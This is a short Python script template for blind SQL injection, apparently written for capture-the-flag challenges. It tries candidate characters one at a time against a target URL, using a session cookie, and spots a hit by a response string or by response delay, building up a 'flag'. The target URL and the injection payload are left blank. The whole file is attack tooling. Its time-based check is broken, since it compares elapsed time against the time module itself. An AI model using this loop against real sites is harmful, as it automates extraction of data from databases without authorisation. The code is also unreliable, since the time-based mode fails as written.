import requests
import time

# candidates
num = '1234567890'
alpha = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
alnum = '1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
alnumsu = '1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_ '
alnumnoregex = '1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_~!@- '
alnumchr = '1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ~!@#$^&*()-=+_%{} '


# exploit settings
url = ''                # url for request
candidate = alpha       # candidate for blind SQLi
flag_len = 0            # length of flag
request_type = 'GET'    # GET of POST
session_name = ''
session = ''
check_string = ''

# time based settings
time_based = False
check_time = 2

cookie = {session_name: session}
flag = ''
for idx in range(0, flag_len):
    chk = True
    for c in candidate:

        payload = {

        }
        response = None

        s = time.time()

        if request_type == 'GET':
            response = requests.get(url=url, cookies=cookie, params=payload)
        elif request_type == 'POST':
            response = requests.post(url=url, cookies=cookie, data=payload)
        elif request_type == 'JSON':
            response = requests.post(url=url, cookies=cookie, json=payload)

        e = time.time()

        r = response.text

        if time_based:
            if e-s > time:
                print(idx, c)
                flag += c
                break
        else:
            if check_string in r:
                print(idx, c)
                flag += c
                chk = False
                break

    if chk:
        print("Not found:", idx)

print(flag)